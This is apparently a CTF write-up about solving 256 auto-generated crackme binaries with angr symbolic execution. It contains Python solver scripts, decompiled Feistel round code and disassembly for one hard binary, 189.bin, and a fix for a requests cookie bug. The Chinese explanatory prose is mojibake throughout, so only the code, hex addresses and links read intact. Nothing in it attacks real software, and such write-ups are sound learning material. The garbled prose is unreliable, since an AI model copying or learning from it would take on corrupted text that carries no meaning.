ï¼ˆè¿™æ®µä»£ç å†™å‡ºæ¥è™½ç„¶éå¸¸çŸ­ï¼Œä½†æ˜¯èŠ±è´¹æ—¶é—´å¾ˆé•¿ï¼Œä¸»è¦æ˜¯å‚è€ƒèµ„æ–™å¾ˆéš¾æ‰¾â€¦â€¦angrçš„æ–‡æ¡£å¹¶æ²¡æœ‰åŒ…å«æ‰€æœ‰çš„ç»†èŠ‚ï¼Œå¿…è¦æ—¶è¿˜å¾—çœ‹æºç ï¼‰  

```python
import sys
import angr
import claripy
import logging
import code

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, "little")

#logging.getLogger('angr').setLevel("CRITICAL")


global_hook_count = 0
def mem_write_hook(state):
    global global_hook_count
    if (state.inspect.mem_write_expr.symbolic):
        # and state.inspect.mem_write_expr.op != 'BVS'):
        global_hook_count += 1
        old = state.inspect.mem_write_expr
        new = claripy.BVS(f"tmp_mem_write_hook_{global_hook_count}", old.length)
        state.add_constraints(new == old)
        state.inspect.mem_write_expr = new

filename = sys.argv[1]
print(filename)
with open(filename, "rb") as f:
    allcontent = f.read()

startaddr = allcontent.index(bytes.fromhex("50 48 89 F1 48 89 FA 48  BF".replace(" ", "")))
startaddr += 0x400000
endaddr = startaddr + 0x21
print(hex(startaddr), hex(endaddr))

proj = angr.Project(filename)
state = proj.factory.blank_state(addr=startaddr)
v0 = state.solver.BVS('v0', 64)
v1 = state.solver.BVS('v1', 64)
state.regs.rdi = v0
state.regs.rsi = v1
state.inspect.b("mem_write", when=angr.BP_BEFORE, action=mem_write_hook)
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=endaddr)
found = simgr.found[0]
found.add_constraints(found.regs.rax == 0)
r0 = found.solver.eval(v0)
r1 = found.solver.eval(v1)

print(r0, r1)
flag = p64(r0)+p64(r1)

print(flag.decode())
print()
```

å¤§çº¦7-8åˆ†é’Ÿï¼ˆæœ€æ…¢ä¸è¶…è¿‡10åˆ†é’Ÿï¼‰èƒ½è§£å‡ºä¸€é“é¢˜ï¼Œå¼€16ä¸ªè¿›ç¨‹åŒæ—¶è·‘ï¼Œ2å°æ—¶åå›æ¥çœ‹ç»“æœï¼Œå‘ç°è¿˜å‰©åå‡ é“é¢˜æ²¡è§£å‡ºæ¥ï¼ŒåŸå› æ˜¯æ±‚è§£å™¨è¿”å›äº†unsatï¼›å¯¹è§£å‡ºæ¥çš„ç»“æœåšéªŒè¯ï¼Œæœ‰å‡ é“é¢˜çš„ç­”æ¡ˆæ˜¯é”™è¯¯çš„ï¼ˆååˆ†ä¸è§£ï¼ŒæŒ‰é“ç†å‰è¿°æ›¿æ¢åº”å½“æ˜¯ä¿å®ˆçš„ï¼Œä¸åº”unsatæˆ–è§£å‡ºé”™è¯¯ç­”æ¡ˆï¼‰  


é’ˆå¯¹è¿™äº›é¢˜ï¼Œæ‰‹åŠ¨é€†å‘æ‰¾åˆ°Feistelè½®å˜é‡èµ‹å€¼çš„å‡†ç¡®åœ°å€ï¼Œç„¶ååªåœ¨è¿™ä¸¤ä¸ªåœ°å€å¤„è¿›è¡Œä¸Šè¿°å˜æ¢ï¼š  
```python
import sys
import angr
import claripy
import logging
import code

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, "little")

logging.getLogger('angr').setLevel("CRITICAL")

#global_context = ("./bins/28.bin", (0x4013f6, 0x401480))
#global_context = ("./bins/36.bin", (0x401389, 0x401406))
#global_context = ("./bins/47.bin", (0x4019e3, 0x401a4c))
#global_context = ("./bins/83.bin", (0x40138d, 0x401430))
#global_context = ("./bins/131.bin", (0x4013e0, 0x401461))
#global_context = ("./bins/145.bin", (0x4013ab, 0x401428))
#global_context = ("./bins/166.bin", (0x4013f5, 0x401498))
global_context = ("./bins/189.bin", (0x4013d8, 0x401441))
#global_context = ("./bins/49.bin", (0x4013ca, 0x401433))
#global_context = ("./bins/106.bin", (0x4019c2, 0x401a09))
#global_context = ("./bins/146.bin", (0x4013b1, 0x401410))
#global_context = ("./bins/194.bin", (0x4013f5, 0x40145a))


global_hook_count = 0
def mem_write_hook(state):
    global global_context
    global global_hook_count
    if (state.inspect.mem_write_expr.symbolic):
        pc = state.regs.rip.args[0]
        assert type(pc) is int
        hook_pclist = global_context[1]
        if not (pc in hook_pclist):
            return
        #print(hex(pc))
        global_hook_count += 1
        old = state.inspect.mem_write_expr
        new = claripy.BVS(f"tmp_mem_write_hook_{global_hook_count}", old.length)
        state.add_constraints(new == old)
        state.inspect.mem_write_expr = new

filename = global_context[0]
print(filename)
with open(filename, "rb") as f:
    allcontent = f.read()

startaddr = allcontent.index(bytes.fromhex("50 48 89 F1 48 89 FA 48  BF".replace(" ", "")))
startaddr += 0x400000
endaddr = startaddr + 0x21
print(hex(startaddr), hex(endaddr))

proj = angr.Project(filename)
state = proj.factory.blank_state(addr=startaddr)
v0 = state.solver.BVS('v0', 64)
v1 = state.solver.BVS('v1', 64)
state.regs.rdi = v0
state.regs.rsi = v1
state.inspect.b("mem_write", when=angr.BP_BEFORE, action=mem_write_hook)
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=endaddr)
found = simgr.found[0]
found.add_constraints(found.regs.rax == 0)
r0 = found.solver.eval(v0)
r1 = found.solver.eval(v1)

print(r0, r1)
flag = p64(r0)+p64(r1)

print(flag.decode())
print()
```

å•é¢˜æ±‚è§£é€Ÿåº¦å¿«äº†ä¸€äº›ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰é¢˜éƒ½å‡ºæ¥äº†ï¼Œåªå‰©ä¸‹ 189.bin è¿™ä¸€ä¸ªå¤§é­”ç‹è¿˜æ˜¯è§£ä¸åŠ¨ï¼ˆunsatï¼‰â€¦â€¦


æ— å¥ˆï¼Œå°è¯•æ‰‹åŠ¨é€†å‘ï¼ˆæœ‰ç‚¹å¤æ‚ï¼Œé€†ä¸åŠ¨ï¼‰  
è¿™æ˜¯189.binçš„sub_1160å‡½æ•°çš„è½®å‡½æ•°éƒ¨åˆ†ï¼š  
```
LABEL_2:
    v4 = sub_1160(0xC6F36E4BA40593B7LL, 0x79BD5BAC3129AB89LL, 0x8F1D2D097B46444LL, a4);
    v5 = sub_1160(0x43D8E4C931F0F2BBLL, 0xF1F1174B00EF805BLL, v4, a4);
    v6 = sub_1160(0x7F5465454593E123LL, 0xB54D226C820D5878LL, v5 - a4, a4);
    v7 = sub_1160(0xC08474758D13882BLL, 0x441F39578FD9F52CLL, v6, a4);
    v8 = sub_1160(0x51C5319D3885AC3BLL, 0xEEEB985A9CA99305LL, 0x535ADC97148E9459LL, v7);
    v9 = sub_1160(0x15A88B6F63DEB4F9LL, 0x202170A4CF01BE1DLL, v8, v7);
    v10 = sub_1160(0xCD438FF4A252BEADLL, 0x675DF7BD254E7AEELL, v9 - v7, v7);
    v11 = sub_1160(0x4515707A3C3DDD11LL, 0xE7FA089A87C8718FLL, v10, v7);
    v12 = sub_1160(0x4DC6B84B1A3D9FBDLL, 0xF2EA11ACBAF19F83LL, 1LL, v11);
    v13 = sub_1160(0xA95AFFBBB87FA421LL, 0x8C6EFC587A60CEF5LL, v12, v11);
    v14 = sub_1160(0x87B286896B926DDDLL, 0xACEF01285C0ECBBELL, v13 - v11, v11);
    v15 = sub_1160(0x16A9B838F8D287ADLL, 0xA2B86C1CE8E97978LL, v14, v11);
    v16 = sub_1160(0x410069451E53E065LL, 0xFFB060B2B6DB5EDBLL, a3, v15);
    v17 = sub_1160(0x929E7CA7AEF1AAA3LL, 0xA32B7F6C83EEC873LL, v16, v15);
    v18 = sub_1160(0xF127956C6CD50545LL, 0x4379F2455ACC3456LL, v17 - v15, v15);
    v19 = sub_1160(0x55C104881C618A41LL, 0xD74E748CA7A4C45FLL, v18, v15);
    a3 = a4;    // 0x13d8
    v20 = sub_1160(0x64AD977B00FCD255LL, 0xCFF3F036C6A46746LL, v48 + 0x12A5A90E5848DDBBLL, 0xED5A56F1A7B72245LL);
    v48 = sub_1160(0x1AD5CBF15DDEA19BLL, 0x19CBBBC069C29800LL, v20, 0xED5A56F1A7B72245LL);
    a4 = v19;    // 0x1441
```
å¯¹åº”çš„æ±‡ç¼–ï¼š
```asm
.text:00000000000013D0                 call    sub_1160
.text:00000000000013D5                 mov     rbx, rax
.text:00000000000013D8                 mov     [rsp+48h+var_38], r12
.text:00000000000013DD                 mov     rbp, 0ED5A56F1A7B72245h
.text:00000000000013E7                 sub     r15, rbp
.text:00000000000013EA                 mov     rdi, 64AD977B00FCD255h
.text:00000000000013F4                 mov     rsi, 0CFF3F036C6A46746h
.text:00000000000013FE                 mov     rdx, r15
.text:0000000000001401                 mov     rcx, rbp
.text:0000000000001404                 call    sub_1160
.text:0000000000001409                 mov     rdi, 1AD5CBF15DDEA19Bh
.text:0000000000001413                 mov     rsi, 19CBBBC069C29800h
.text:000000000000141D                 mov     rdx, rax
.text:0000000000001420                 mov     rcx, rbp
.text:0000000000001423                 call    sub_1160
.text:0000000000001428                 mov     r9, 40B0C9F7D52F3F3Fh
.text:0000000000001432                 mov     r8, 2AEF4BED0D1DEC46h
.text:000000000000143C                 mov     [rsp+48h+var_40], rax
.text:0000000000001441                 mov     [rsp+48h+var_48], rbx
.text:0000000000001445                 db      2Eh
.text:0000000000001445                 nop     word ptr [rax+rax+00000000h]
.text:000000000000144F                 nop
```
çœ‹èµ·æ¥å’Œå…¶ä»–ç¨‹åºå®Œå…¨ä¸€æ ·ï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆå°±æ˜¯è§£ä¸åŠ¨ï¼Œè€Œä¸”ï¼Œä»…æŠ½å‡ºä¸€è½®è¿›è¡Œæ±‚è§£ï¼Œä¹Ÿä»ç„¶æ˜¯unsat  
åæ¥ï¼ˆè‡³å°‘2å°æ—¶åï¼‰ï¼Œå°è¯•æŠŠæ‰§è¡Œç»ˆç‚¹ä»0x1441æ”¹åˆ°äº†0x13ddï¼ˆå› ä¸ºå‘ç°v19çš„å€¼åœ¨è¿™é‡Œå°±å·²ç»ç¡®å®šäº†ï¼Œä½†ç›´åˆ°0x1441æ‰èµ‹å€¼ç»™äº†a4ï¼‰ï¼Œå°±èƒ½æˆåŠŸæ±‚è§£ï¼Œä¸çŸ¥é“0x1404å’Œ0x1423çš„ä¸¤ä¸ªcallåˆ°åº•åšäº†ä»€ä¹ˆ  

é’ˆå¯¹189.binçš„ç‰¹åˆ«æ±‚è§£ä»£ç ï¼š
```python
import sys
import angr
import claripy
import logging
import code
import random

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, "little")

logging.getLogger('angr').setLevel("CRITICAL")

global_context = ("./bins/189.bin", (0x4013d8, 0x401441))


filename = global_context[0]


def reverse_final_part():
    global filename
    proj = angr.Project(filename)
    state = proj.factory.blank_state(addr=0x401596)
    a3 = claripy.BVS('a3', 64)
    a4 = claripy.BVS('a4', 64)
    state.regs.r14 = claripy.BVV(0x4C46BFC2FC516059, 64)
    state.regs.r13 = claripy.BVV(0x34A187B1C7A1399A, 64)
    state.regs.r8 = claripy.BVV(0x2AEF4BED0D1DEC46, 64)
    state.regs.r9 = claripy.BVV(0x40B0C9F7D52F3F3F, 64)
    state.mem[state.regs.rsp+0x8].uint64_t = claripy.BVV(0xFBDFC49AD1961987 ^ 0x2DF576F67FD515A8, 64)
    state.mem[state.regs.rsp+0x10].uint64_t = a3
    state.mem[state.regs.rsp].uint64_t = a4

    simgr = proj.factory.simulation_manager(state)
    simgr.explore(find=0x401818)

    found = simgr.found[0]
    found.add_constraints(found.regs.rcx == 0)
    r0 = found.solver.eval(a3)
    r1 = found.solver.eval(a4)

    print(r0, r1)
    print(p64(r0)+p64(r1))
    return r0, r1


def reverse_middle_part(new_a3, new_a4):
    global filename
    proj = angr.Project(filename)
    state = proj.factory.blank_state(addr=0x4011ac)
    a3 = claripy.BVS('a3', 64)
    a4 = claripy.BVS('a4', 64)
    state.regs.r14 = claripy.BVV(0x4C46BFC2FC516059, 64)
    state.regs.r13 = claripy.BVV(0x34A187B1C7A1399A, 64)
    state.regs.r8 = claripy.BVV(0x2AEF4BED0D1DEC46, 64)
    state.regs.r9 = claripy.BVV(0x40B0C9F7D52F3F3F, 64)
    state.mem[state.regs.rsp+0x8].uint64_t = claripy.BVV(0xFBDFC49AD1961987 ^ 0x2DF576F67FD515A8, 64)
    state.mem[state.regs.rsp+0x10].uint64_t = a3
    state.mem[state.regs.rsp].uint64_t = a4

    simgr = proj.factory.simulation_manager(state)
    #simgr.explore(find=0x401450)
    simgr.explore(find=0x4013dd)

    found = simgr.found[0]
    '''
    print("final rsp", found.regs.rsp)
    print(found.regs.rbx)
    print(found.mem[found.regs.rsp+0x10].uint64_t)
    print(found.mem[found.regs.rsp].uint64_t)
    '''
    #found.add_constraints(found.mem[found.regs.rsp+0x10].uint64_t == new_a3)
    #found.add_constraints(found.mem[found.regs.rsp].uint64_t == new_a4)
    found.add_constraints(found.regs.r12 == new_a3)
    found.add_constraints(found.regs.rbx == new_a4)
    r0 = found.solver.eval(a3)
    r1 = found.solver.eval(a4)

    print(r0, r1)
    print(p64(r0)+p64(r1))
    return r0, r1

# x, y = reverse_final_part()
x, y = 14706480248683425753, 2708692238484913893
for i in range(16):
    print(i)
    x, y = reverse_middle_part(x, y)
```

æœ€åå°±æ˜¯256é“é¢˜çš„ç­”æ¡ˆæäº¤ï¼Œå»å¹´å°±è¢«cookieçš„æ›´æ–°é—®é¢˜å‘äº†ï¼Œä»Šå¹´ç‰¹æ„å‚ç…§äº†å»å¹´é¢˜è§£çš„æäº¤ä»£ç  [https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/players/mcfx/writeup.md#%E8%B6%85%E5%9F%BA%E7%A1%80%E7%9A%84%E6%95%B0%E7%90%86%E6%A8%A1%E6%8B%9F%E5%99%A8](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/players/mcfx/writeup.md#%E8%B6%85%E5%9F%BA%E7%A1%80%E7%9A%84%E6%95%B0%E7%90%86%E6%A8%A1%E6%8B%9F%E5%99%A8 ),
å‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œä»¿ä½›å“åº”å¤´çš„Set-Cookieå­—æ®µæ²¡æœ‰ç”Ÿæ•ˆ  
ç›´åˆ°æŸ¥åˆ°è¿™ç¯‡æ–‡ç«  [https://iyaozhen.com/python-requests-session-set-cookie-not-working.html](https://iyaozhen.com/python-requests-session-set-cookie-not-working.html )ï¼Œ
å‘ç°ä½ç‰ˆæœ¬requestsåº“æœ‰bugï¼Œè€Œæœ¬åœ°ç¡®å®å¾ˆä¹…æ²¡æ›´æ–°äº†ã€‚  
è·‘äº†ä¸€ä¸‹`pip install --upgrade requests`ï¼Œç„¶åå°±æ­£å¸¸äº†  
